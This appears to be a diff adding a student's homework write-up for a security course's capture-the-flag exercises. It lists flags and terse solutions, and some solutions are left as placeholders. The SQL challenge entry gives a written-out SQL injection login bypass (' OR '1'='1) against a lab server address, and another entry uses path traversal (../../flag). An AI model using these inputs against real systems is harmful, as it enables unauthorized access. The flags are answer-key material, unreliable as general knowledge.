@@ -1,0 +1,47 @@
+Remi Trettin
+CIS4930
+HW 2
+
+URL Encoding
+FLAG: flag{h1d1ng_1n_pl41n_s1t3}
+Solution: explain
+
+code
+
+Base64
+FLAG: flag{a11_y0ur_b4s3_R_b3l0ng_2_Us}
+Solution: explain
+
+code
+
+Calculator
+FLAG: flag{you_should_have_solved_this_in_ruby}
+Solution: explain
+
+code
+
+SQL Challenge
+FLAG: flag{pr377y_345y_w17h_7h3_$0urc3_c0d3_huh?}
+Solution: used postman
+sent POST http://67.207.89.115:8080/WebI/sqlchallenge.php?iamahacker=true&debug=true
+	username = ' OR '1'='1
+	password = ' OR '1'='1
+
+Profile I
+FLAG: flag{l0c4l_f1l3_in7rus10n_3xpl0173d!}
+Solution: used browser
+changed index.php?page=home to index.php?page=../../flag
+
+Top Hackers
+FLAG: flag{y0u_d1d_n07_d0_7h47_By_h4nD_D1d_y0U?}
+Solution: view source of tophackers.php
+noticed trinity.jpg was hidden
+viewed the image, appeared as nothing
+used postman to GET the image
+viewed response headers that showed large content-length
+downloaded the "image"...probably not an image
+opened image in text editor, contained base64
+decoded base64
+contained obnoxious javascript function
+pasted function into browser JS console
+ran function, got flag
